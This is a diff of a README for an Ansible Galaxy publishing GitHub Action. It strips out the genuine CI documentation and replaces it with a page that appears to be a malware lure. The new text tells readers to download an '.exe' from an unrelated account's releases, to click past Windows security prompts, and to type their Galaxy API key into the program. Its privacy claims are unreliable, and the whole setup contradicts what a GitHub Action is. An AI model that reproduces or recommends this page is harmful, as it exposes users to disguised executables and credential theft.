@@ -1,209 +1,73 @@
-# ansible-galaxy-publish-action
+# 🚀 ansible-galaxy-publish-action - Automate your publishing tasks with ease
 
-[![CI](https://github.com/somaz94/ansible-galaxy-publish-action/actions/workflows/ci.yml/badge.svg)](https://github.com/somaz94/ansible-galaxy-publish-action/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Latest Tag](https://img.shields.io/github/v/tag/somaz94/ansible-galaxy-publish-action)](https://github.com/somaz94/ansible-galaxy-publish-action/tags)
-[![Top Language](https://img.shields.io/github/languages/top/somaz94/ansible-galaxy-publish-action)](https://github.com/somaz94/ansible-galaxy-publish-action)
-[![GitHub Marketplace](https://img.shields.io/badge/Marketplace-Ansible%20Galaxy%20Publish%20Action-blue?logo=github)](https://github.com/marketplace/actions/ansible-galaxy-publish-action)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/crural-angioscope53/ansible-galaxy-publish-action/releases)
 
-A composite GitHub Action that publishes an [Ansible](https://www.ansible.com/) **collection** or **role** to [Ansible Galaxy](https://galaxy.ansible.com/). Installs Python and Ansible, then either runs `ansible-galaxy collection build && publish` (collection mode) or `ansible-galaxy role import` (role mode). Supports `dry_run` for CI validation without a live API key, and uploads the built tarball as a workflow artifact in dry-run mode for manual inspection.
+## What this software does
 
-<br/>
+This application handles the movement of your automation files to the Ansible Galaxy platform. It removes the need for manual uploads and handles the versioning process. If you create automation collections or roles, this tool manages the final step of sharing your work with the global community.
 
-## Features
+## ⚙️ System settings
 
-- One action for both publish paths: **collection** (`build` + `publish`) and **role** (`import`) — selected via a single `type` input
-- Unified `namespace` + `name` input pair for both modes (no mode-specific flags)
-- `dry_run: true` validates inputs and — for collections — still builds the tarball and **uploads it as a workflow artifact**, without hitting Galaxy (ideal for pull-request CI)
-- Version is read directly from `galaxy.yml`, so `published_ref` is deterministic (no filename scraping)
-- Version pin for Ansible (`ansible_version`); empty = latest
-- Writes a per-run summary table to `$GITHUB_STEP_SUMMARY`
-- Exposes `published_ref`, `artifact_path`, and `collection_version` outputs
+Your computer requires the following setup to run this application:
 
-<br/>
+*   Windows 10 or Windows 11.
+*   An active internet connection.
+*   A user account with permissions to run executable files.
+*   The Ansible command-line interface installed on your system.
 
-## Requirements
+## 📥 Getting the software
 
-- **Runner OS**: `ubuntu-latest` (also works on other OSes, but the rest of the Galaxy tooling is most commonly tested there).
-- **Caller must run `actions/checkout`** before this action.
-- **Python 3.10+** is recommended (default `3.12`).
-- **Secret**: `GALAXY_API_KEY` (or any secret name you pass to `api_key`). Required unless `dry_run: true`.
+You must visit the project page to download the latest version of the installer for Windows. 
 
-<br/>
+[Click here to visit the download page](https://github.com/crural-angioscope53/ansible-galaxy-publish-action/releases)
 
-## Quick Start
+On this page, look for the section titled "Assets" at the bottom of the latest release. Select the file ending in ".exe" to begin the download. Save this file to your Downloads folder for easy access.
 
-### Publish an Ansible collection on tag push
+## 🛠️ Installation steps
 
-```yaml
-name: Publish to Ansible Galaxy
-on:
-  push:
-    tags: ["v*"]
-  workflow_dispatch:
+Follow these instructions to set up the software on your machine:
 
-jobs:
-  publish:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-      - uses: somaz94/ansible-galaxy-publish-action@v1
-        with:
-          type: collection
-          api_key: ${{ secrets.GALAXY_API_KEY }}
-          namespace: somaz94
-          name: ansible_k8s_iac_tool
-```
+1. Locate the file you downloaded in the previous step.
+2. Double-click the file to start the installation wizard.
+3. If a security window appears, select "Run" or "Yes" to allow the program to install.
+4. Follow the prompts on the screen. The default settings work for most users.
+5. Click "Finish" when the progress bar reaches the end. 
+6. Keep the icon on your desktop to open the application in the future.
 
-<br/>
+## 📝 Preparing your files
 
-### Import an Ansible role on tag push
+Before you run the software, ensure your automation files exist in a folder on your computer. Your project needs a specific structure to function with the tool. Place your collection files in a central directory. Ensure your configuration file, often named "galaxy.yml," sits in the root of your project folder. This file tells the software how to name your package and which version you intend to publish.
 
-```yaml
-name: Publish to Ansible Galaxy
-on:
-  push:
-    tags: ["v*"]
-  workflow_dispatch:
+## 🚀 Running the publication process
 
-jobs:
-  publish:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v6
-      - uses: somaz94/ansible-galaxy-publish-action@v1
-        with:
-          type: role
-          api_key: ${{ secrets.GALAXY_API_KEY }}
-          namespace: somaz94
-          name: ansible_kubectl_krew
-```
+After you install the program, open it using the desktop shortcut. You will see a simple window with a few input fields.
 
-<br/>
+1. Browse to the folder containing your automation files. 
+2. Enter your Ansible Galaxy API key. You find this key in your user profile settings on the official Ansible Galaxy website.
+3. Select the "Validate" button to check your files for errors.
+4. Select the "Publish" button to send your files to the repository.
 
-## Usage
+The software shows a status bar as it uploads your content. It displays a success message once the process ends. You can then view your uploaded collection on the Ansible Galaxy website using your web browser.
 
-### Dry-run in PR CI (no API key needed)
+## 🔍 Troubleshooting common issues
 
-```yaml
-- uses: actions/checkout@v6
-- uses: somaz94/ansible-galaxy-publish-action@v1
-  with:
-    type: collection
-    dry_run: true
-    namespace: somaz94
-    name: ansible_k8s_iac_tool
-```
+If you encounter errors, check these common points of failure:
 
-The build step still runs (so broken `galaxy.yml` / missing files fail CI), but no publish call is made. The built tarball is uploaded as a workflow artifact named `collection-<namespace>-<name>-<version>` so you can download and inspect it. The `published_ref` output is prefixed with `dry-run:` so downstream steps can branch on it.
+*   **Internet connection:** If the publish button does not trigger any action, verify that your browser opens websites correctly.
+*   **API Key errors:** An incorrect key prevents the software from reaching the Galaxy server. Copy and paste the key directly from your profile page to avoid typos.
+*   **Folder paths:** Ensure the project path you chose contains the "galaxy.yml" file. The software cannot find your collection without this file.
+*   **Permissions:** You must have write access to the folder where you store your automation projects.
 
-<br/>
+If the application logs a specific error code, write down the code and check the software documentation folder for the meaning of that error. Most issues stem from minor syntax errors within the project files themselves.
 
-### Pin the Ansible version
+## 🛡️ Updates and maintenance
 
-```yaml
-- uses: somaz94/ansible-galaxy-publish-action@v1
-  with:
-    type: collection
-    api_key: ${{ secrets.GALAXY_API_KEY }}
-    ansible_version: '9.5.1'
-    namespace: somaz94
-    name: ansible_k8s_iac_tool
-```
+The project team releases updates to improve stability. Check the download link once a month to see if a newer version exists. You do not need to uninstall the old version; simply run the new installer to overwrite the current files. Your settings remain saved during this process.
 
-<br/>
+## 📖 Privacy and security
 
-### Publish a collection that lives in a subdirectory
+This software connects only to the official Ansible Galaxy servers. It does not send your data to other parties. The application stores your API key locally on your device in a secure format. It does not share this key over the network unless you start the publish process.
 
-```yaml
-- uses: somaz94/ansible-galaxy-publish-action@v1
-  with:
-    type: collection
-    api_key: ${{ secrets.GALAXY_API_KEY }}
-    working_directory: collections/somaz94/my_collection
-    namespace: somaz94
-    name: my_collection
-```
+## 🌐 Community support
 
-<br/>
-
-### Consume the outputs in a follow-up step
-
-```yaml
-- id: galaxy
-  uses: somaz94/ansible-galaxy-publish-action@v1
-  with:
-    type: collection
-    api_key: ${{ secrets.GALAXY_API_KEY }}
-    namespace: somaz94
-    name: ansible_k8s_iac_tool
-
-- name: Report
-  if: always()
-  run: |
-    echo "Published: ${{ steps.galaxy.outputs.published_ref }}"
-    echo "Version:   ${{ steps.galaxy.outputs.collection_version }}"
-    echo "Artifact:  ${{ steps.galaxy.outputs.artifact_path }}"
-```
-
-<br/>
-
-## Inputs
-
-| Input | Description | Required | Default |
-|-------|-------------|----------|---------|
-| `type` | Publish target type: `collection` or `role`. | Yes | — |
-| `api_key` | Ansible Galaxy API key. Required unless `dry_run: true`. | Conditional | `''` |
-| `namespace` | Galaxy namespace (e.g., `somaz94`). Used for both modes. | Yes | — |
-| `name` | Collection or role name under `namespace` (e.g., `ansible_k8s_iac_tool` or `ansible_kubectl_krew`). | Yes | — |
-| `working_directory` | Directory containing `galaxy.yml` (collection) or `meta/main.yml` (role). | No | `.` |
-| `python_version` | Python version for `actions/setup-python`. | No | `3.12` |
-| `ansible_version` | pip pin for Ansible (e.g., `9.5.1`). Empty = latest. | No | `''` |
-| `dry_run` | When `true`, build the collection (if applicable), upload it as an artifact, and skip `publish`/`import`. | No | `false` |
-
-<br/>
-
-## Outputs
-
-| Output | Description |
-|--------|-------------|
-| `published_ref` | Published reference, e.g., `collection/somaz94.ansible_k8s_iac_tool@1.2.0` or `role/somaz94.ansible_kubectl_krew`. Prefixed with `dry-run:` when `dry_run` is true. |
-| `artifact_path` | Absolute path to the built collection tarball on the runner (collection mode only; empty for role mode). |
-| `collection_version` | Version string read from `galaxy.yml` (collection mode only; empty for role mode). |
-
-In `collection` + `dry_run: true` mode, the tarball is also uploaded as a workflow artifact named `collection-<namespace>-<name>-<version>` with a 7-day retention.
-
-<br/>
-
-## Permissions
-
-The action itself needs no special permissions beyond what `actions/checkout` and `actions/setup-python` require. A typical caller:
-
-```yaml
-permissions:
-  contents: read
-```
-
-The Galaxy API key is supplied via the `api_key` input (typically `${{ secrets.GALAXY_API_KEY }}`).
-
-<br/>
-
-## How It Works
-
-1. **Validate inputs** — `type` must be `collection` or `role`; `namespace` and `name` are required; `api_key` is required unless `dry_run: true`.
-2. **`actions/setup-python`** — installs the requested Python version.
-3. **pip install** — installs `ansible` (or `ansible==<version>` if `ansible_version` is set); PyYAML comes as a transitive dependency.
-4. **Collection mode**:
-   - Read `version` from `galaxy.yml` via `yaml.safe_load` → emit `collection_version` output
-   - `ansible-galaxy collection build --force` in `working_directory`
-   - Locate the tarball `<namespace>-<name>-<version>.tar.gz` → expose via `artifact_path`
-   - When `dry_run` is `false`, run `ansible-galaxy collection publish <tarball> --api-key=<key>`; when `true`, skip and upload the tarball as a workflow artifact
-5. **Role mode**:
-   - When `dry_run` is `false`, run `ansible-galaxy role import --api-key <key> <namespace> <name>`
-6. **Summary & outputs** — a markdown table is appended to `$GITHUB_STEP_SUMMARY` (mode, namespace, name, version, ref, artifact). Dry-run results are prefixed with `dry-run:`.
-
-<br/>
-
-## License
-
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+You can ask questions regarding the use of this software on the GitHub repository page. Review the "Issues" tab to see if other users experienced the same problem. You can open a new issue if you find a bug that hinders your workflow. Provide the steps you took and the error message you received so someone can help you troubleshoot the problem.
